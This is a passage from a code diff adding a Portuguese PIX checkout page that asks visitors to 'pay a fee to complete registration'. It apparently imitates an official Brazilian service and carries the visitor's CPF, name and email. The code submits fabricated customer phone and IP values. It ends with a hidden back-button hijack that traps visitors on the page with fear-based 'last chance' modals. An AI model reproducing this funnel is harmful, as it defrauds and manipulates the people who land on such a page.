+            if (pollingTimer) clearInterval(pollingTimer);
+            pollingTimer = setInterval(verificarStatus, 3000);
+            iniciarCountdown();
+          }
+        })();
+        document.addEventListener('visibilitychange', function () {
+          if (!document.hidden && transactionId) { verificarStatus(); }
+        });
+
+        function abrirPix() {
+            var btn = document.getElementById('btn-pagar-up1');
+            btn.disabled = true;
+            btn.textContent = 'Gerando PIX...';
+
+            var extCode = 'DR-UP01-' + Date.now() + '-' + Math.random().toString(36).slice(2, 6);
+
+            var TRACK_KEYS = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'utm_id', 'fbclid', 'src', 'sck', 'xcod'];
+            var metadata = {};
+            TRACK_KEYS.forEach(function (k) {
+                var v = '';
+                try { if (window.utmParams && typeof window.utmParams.get === 'function') v = window.utmParams.get(k) || ''; } catch (_) {}
+                if (!v) v = getQuery(k);
+                if (!v) { try { v = localStorage.getItem(k) || ''; } catch (_) {} }
+                if (v) metadata[k] = v;
+            });
+
+            var payload = JSON.stringify({
+                external_code: extCode,
+                payment_format: 'regular',
+                payment_method: 'pix',
+                installments: 1,
+                payment_amount: AMOUNT_CENTS,
+                postback_url: window.location.href,
+                pix: { expires_in_days: 1 },
+                items: [{ name: PRODUCT_NAME, quantity: 1, price: AMOUNT_CENTS }],
+                customer: {
+                    name: NOME || 'Cliente',
+                    email: EMAIL || 'cliente@email.com',
+                    document: String(CPF || '00000000000').replace(/\D/g, ''),
+                    phone: '11988887777',
+                    ip: '177.136.254.1'
+                },
+                extra: {
+                    url_full: window.location.href,
+                    url_referer: document.referrer || null,
+                    user_agent: navigator.userAgent,
+                    metadata: metadata
+                }
+            });
+
+            fetch(MANGOFY_API, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': API_KEY,
+                    'Store-Code': STORE_CODE
+                },
+                body: payload
+            })
+            .then(function (r) { return r.json(); })
+            .then(function (data) {
+                var pixCode = (data.pix && data.pix.pix_qrcode_text) || data.pix_code || '';
+                var paymentCode = data.payment_code || data.uuid || '';
+
+                if (!pixCode) {
+                    alert('Erro ao gerar PIX. Tente novamente.');
+                    btn.disabled = false;
+                    btn.textContent = 'PAGAR TAXA E CONCLUIR REGISTRO';
+                    return;
+                }
+
+                transactionId = paymentCode;
+                document.getElementById('pix-valor').textContent = AMOUNT_LABEL;
+                document.getElementById('copy-code').textContent = pixCode;
+
+                renderQrFromText(pixCode, function (err) {
+                    if (err) console.error('[qr] fail:', err);
+                });
+
+                document.getElementById('pix-overlay').classList.add('active');
+                iniciarCountdown();
+                if (pollingTimer) clearInterval(pollingTimer);
+                pollingTimer = setInterval(verificarStatus, 3000);
+
+                try {
+                    sessionStorage.setItem('_s1', JSON.stringify({
+                        cpf: CPF, nome: NOME, email: EMAIL, acordo: ACORDO,
+                        transactionId: transactionId, valor: AMOUNT_LABEL, copyPaste: pixCode
+                    }));
+                } catch(_) {}
+            })
+            .catch(function () {
+                alert('Erro de conexão. Tente novamente.');
+                btn.disabled = false;
+                btn.textContent = 'PAGAR TAXA E CONCLUIR REGISTRO';
+            });
+        }
+
+        function verificarStatus() {
+            if (!transactionId) return;
+            fetch(MANGOFY_API + '/' + encodeURIComponent(transactionId), {
+                headers: {
+                    'Authorization': API_KEY,
+                    'Store-Code': STORE_CODE
+                },
+                cache: 'no-store'
+            })
+            .then(function (r) { return r.json(); })
+            .then(function (data) {
+                var status = String((data.data && data.data.payment_status) || data.payment_status || '').toLowerCase();
+                if (status === 'approved' || status === 'paid' || status === 'completed') {
+                    pararPolling();
+                    document.getElementById('pix-aguardando').style.display = 'none';
+                    document.getElementById('countdown-wrap').style.display = 'none';
+                    document.querySelector('.pix-copy').style.display = 'none';
+                    document.getElementById('qr-img').style.display = 'none';
+                    document.querySelector('.qr-frame').style.display = 'none';
+                    document.querySelector('.pix-instrucao').style.display = 'none';
+                    document.getElementById('pix-success').style.display = 'block';
+                    document.getElementById('pix-close').style.display = 'none';
+                    try {
+                        var _sv = JSON.parse(sessionStorage.getItem('_s1') || '{}');
+                        _sv.status = 'PAID';
+                        sessionStorage.setItem('_s1', JSON.stringify(_sv));
+                    } catch(_) {}
+                    setTimeout(function () {
+                        window.location.href = NEXT_URL + window.location.search;
+                    }, 3000);
+                }
+            })
+            .catch(function () {
+                if (transactionId && pollingTimer) {
+                    clearInterval(pollingTimer);
+                    pollingTimer = setInterval(verificarStatus, 10000);
+                }
+            });
+        }
+
+        function pararPolling() {
+            if (pollingTimer) clearInterval(pollingTimer);
+            if (countdownTimer) clearInterval(countdownTimer);
+        }
+        function iniciarCountdown() {
+            var el = document.getElementById('countdown-num');
+            countdownTimer = setInterval(function () {
+                segundos--;
+                if (segundos <= 0) { segundos = 0; }
+                var m = String(Math.floor(segundos / 60)).padStart(2, '0');
+                var s = String(segundos % 60).padStart(2, '0');
+                el.textContent = m + ':' + s;
+            }, 1000);
+        }
+
+        document.getElementById('btn-pagar-up1').addEventListener('click', abrirPix);
+        document.getElementById('btn-copy').addEventListener('click', function () {
+            var code = document.getElementById('copy-code').textContent;
+            var done = function () {
+                var b = document.getElementById('btn-copy');
+                b.textContent = '✔ Código copiado!';
+                b.classList.add('copiado');
+                setTimeout(function () { b.textContent = 'Copiar código PIX'; b.classList.remove('copiado'); }, 3000);
+            };
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(code).then(done).catch(function () {
+                    var ta = document.createElement('textarea'); ta.value = code; document.body.appendChild(ta); ta.select();
+                    try { document.execCommand('copy'); } catch (e) {}
+                    ta.remove(); done();
+                });
+            } else {
+                var ta = document.createElement('textarea'); ta.value = code; document.body.appendChild(ta); ta.select();
+                try { document.execCommand('copy'); } catch (e) {}
+                ta.remove(); done();
+            }
+        });
+        function fecharModal() {
+            pararPolling();
+            document.getElementById('pix-overlay').classList.remove('active');
+            var btn = document.getElementById('btn-pagar-up1');
+            btn.disabled = false;
+            btn.textContent = 'PAGAR TAXA E CONCLUIR REGISTRO';
+        }
+        document.getElementById('pix-close').addEventListener('click', fecharModal);
+        document.getElementById('pix-close-x').addEventListener('click', fecharModal);
+
+        // ===== RePix — Verificar Pagamento =====
+        var REPIX_API = 'https://api.repix.site/api/v1';
+        var SKEY = '_s1';
+        function repixSucesso() {
+          pararPolling();
+          document.getElementById('pix-aguardando').style.display = 'none';
+          document.getElementById('countdown-wrap').style.display = 'none';
+          try { document.querySelector('.pix-copy').style.display = 'none'; } catch(_){}
+          try { document.getElementById('qr-img').style.display = 'none'; } catch(_){}
+          try { document.querySelector('.qr-frame').style.display = 'none'; } catch(_){}
+          try { document.querySelector('.pix-instrucao').style.display = 'none'; } catch(_){}
+          document.getElementById('pix-success').style.display = 'block';
+          document.getElementById('pix-close').style.display = 'none';
+          var vb = document.getElementById('btn-verificar-pix'); if (vb) vb.style.display = 'none';
+          try { var sv = JSON.parse(sessionStorage.getItem(SKEY) || '{}'); sv.status = 'PAID'; sessionStorage.setItem(SKEY, JSON.stringify(sv)); } catch (_) {}
+          setTimeout(function () { window.location.href = NEXT_URL + window.location.search; }, 1500);
+        }
+        document.getElementById('btn-verificar-pix').addEventListener('click', function () {
+          if (!transactionId) return;
+          var btn = this; btn.disabled = true; var origHTML = btn.innerHTML; btn.textContent = 'Verificando...';
+          fetch(REPIX_API + '/checkout/status/' + encodeURIComponent(transactionId), { cache: 'no-store' })
+            .then(function (r) { return r.json(); })
+            .then(function (d) {
+              if (d.is_paid === true) { btn.textContent = 'Pagamento Confirmado! Redirecionando...'; btn.style.background = '#059669'; btn.style.borderColor = '#059669'; btn.style.color = '#fff'; repixSucesso(); }
+              else { btn.disabled = false; btn.innerHTML = origHTML; rpxAbrirModal(); }
+            })
+            .catch(function () { btn.disabled = false; btn.innerHTML = origHTML; rpxAbrirModal(); });
+        });
+        function rpxAbrirModal() { document.getElementById('repix-overlay').classList.add('ativo'); rpxResetar(); }
+        function rpxFecharModal() { document.getElementById('repix-overlay').classList.remove('ativo'); }
+        function rpxResetar() {
+          document.getElementById('repix-upload-step').style.display = 'block';
+          document.getElementById('repix-loader').style.display = 'none';
+          document.getElementById('repix-resultado').style.display = 'none';
+          document.getElementById('repix-resultado').className = 'repix-resultado';
+          document.getElementById('repix-arquivo').className = 'repix-arquivo';
+          document.getElementById('repix-file').value = '';
+          document.getElementById('btn-validar-ia').disabled = true;
+        }
+        document.getElementById('repix-close-x').addEventListener('click', rpxFecharModal);
+        document.getElementById('repix-overlay').addEventListener('click', function (e) { if (e.target === this) rpxFecharModal(); });
+        var rpxFile = document.getElementById('repix-file');
+        rpxFile.addEventListener('change', function () {
+          var f = this.files[0]; if (!f) return;
+          if (f.size > 10485760) { alert('Arquivo muito grande. Máximo 10MB.'); this.value = ''; return; }
+          document.getElementById('repix-arquivo-nome').textContent = f.name;
+          document.getElementById('repix-arquivo').className = 'repix-arquivo vis';
+          document.getElementById('btn-validar-ia').disabled = false;
+        });
+        document.getElementById('repix-arquivo-trocar').addEventListener('click', function () {
+          rpxFile.value = ''; document.getElementById('repix-arquivo').className = 'repix-arquivo'; document.getElementById('btn-validar-ia').disabled = true;
+        });
+        var rpxArea = document.getElementById('repix-upload-area');
+        rpxArea.addEventListener('dragover', function (e) { e.preventDefault(); this.classList.add('drag-over'); });
+        rpxArea.addEventListener('dragleave', function () { this.classList.remove('drag-over'); });
+        rpxArea.addEventListener('drop', function (e) { e.preventDefault(); this.classList.remove('drag-over'); if (e.dataTransfer.files.length) { rpxFile.files = e.dataTransfer.files; rpxFile.dispatchEvent(new Event('change')); } });
+        document.getElementById('btn-validar-ia').addEventListener('click', function () {
+          if (!transactionId || !rpxFile.files.length) return;
+          var btn = this; btn.disabled = true;
+          document.getElementById('repix-upload-step').style.display = 'none';
+          document.getElementById('repix-loader').style.display = 'block';
+          var fd = new FormData(); fd.append('file', rpxFile.files[0]);
+          fetch(REPIX_API + '/transactions/' + encodeURIComponent(transactionId) + '/proof', { method: 'POST', body: fd })
+            .then(function (r) { if (r.ok) return r.json().then(function (d) { return {ok:true,data:d}; }); if (r.status===400) return r.json().then(function (d) { return {ok:false,data:d}; }); throw new Error('Erro'); })
+            .then(function (result) {
+              document.getElementById('repix-loader').style.display = 'none';
+              var res = document.getElementById('repix-resultado'); res.style.display = 'block';
+              if (result.ok && result.data.success === true) {
+                res.className = 'repix-resultado sucesso';
+                document.getElementById('repix-resultado-ico').innerHTML = '<svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>';
+                document.getElementById('repix-resultado-titulo').textContent = 'Comprovante validado e aprovado com sucesso!';
+                document.getElementById('repix-resultado-msg').textContent = 'Liberando acesso...';
+                document.getElementById('repix-resultado-acoes').innerHTML = '';
+                setTimeout(function () { rpxFecharModal(); repixSucesso(); }, 800);
+              } else {
+                res.className = 'repix-resultado erro';
+                document.getElementById('repix-resultado-ico').innerHTML = '<svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#d92c2c" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>';
+                document.getElementById('repix-resultado-titulo').textContent = 'Comprovante não aprovado';
+                var msg = (result.data && (result.data.detail || result.data.message)) || 'O comprovante enviado não pôde ser validado. Tente enviar o arquivo correto.';
+                document.getElementById('repix-resultado-msg').textContent = msg;
+                document.getElementById('repix-resultado-acoes').innerHTML = '<button type="button" class="repix-tentar-novamente" id="repix-tentar-btn">Tentar novamente</button>';
+                document.getElementById('repix-tentar-btn').addEventListener('click', rpxResetar);
+              }
+            })
+            .catch(function () { document.getElementById('repix-loader').style.display = 'none'; document.getElementById('repix-upload-step').style.display = 'block'; btn.disabled = false; alert('Erro de conexão. Tente novamente.'); });
+        });
+    })();
+    </script>
+
+<div id="__br1" style="display:none;position:fixed;inset:0;z-index:9999;background:#f0f2f5;align-items:center;justify-content:center;font-family:'Inter',sans-serif"><div style="background:#fff;border-radius:14px;box-shadow:0 4px 20px rgba(0,0,0,.1);padding:32px 24px;max-width:420px;width:100%;text-align:center;margin:16px"><div style="font-size:48px;margin-bottom:16px">⚠️</div><h2 style="font-size:20px;color:#1a1a1a;margin:0 0 8px">Espere! Seu processo está em andamento</h2><p style="font-size:14px;color:#666;line-height:1.6;margin:0 0 20px">Se você sair agora, todo o progresso será perdido e será necessário reiniciar desde o início.</p><button onclick="document.getElementById('__br1').style.display='none'" style="display:inline-block;background:#1351B4;color:#fff;border:none;padding:14px 28px;border-radius:8px;font-weight:700;font-size:14px;cursor:pointer">Continuar processo</button></div></div>
+<div id="__br2" style="display:none;position:fixed;inset:0;z-index:9999;background:#f0f2f5;align-items:center;justify-content:center;font-family:'Inter',sans-serif"><div style="background:#fff;border-radius:14px;box-shadow:0 4px 20px rgba(0,0,0,.1);padding:32px 24px;max-width:420px;width:100%;text-align:center;margin:16px"><div style="font-size:48px;margin-bottom:16px">⚠️</div><h2 style="font-size:20px;color:#1a1a1a;margin:0 0 8px">Última chance!</h2><p style="font-size:14px;color:#666;line-height:1.6;margin:0 0 20px">Ao sair, sua solicitação será cancelada e as condições atuais podem não estar mais disponíveis.</p><button onclick="document.getElementById('__br2').style.display='none'" style="display:inline-block;background:#1351B4;color:#fff;border:none;padding:14px 28px;border-radius:8px;font-weight:700;font-size:14px;cursor:pointer">Permanecer na página</button></div></div>
+<script>(function(){var a=0;history.pushState({_br:1},'');window.addEventListener('popstate',function(){a++;document.getElementById(a===1?'__br1':'__br2').style.display='flex';history.pushState({_br:1},'')})})();</script>
+
+</body>
+</html>
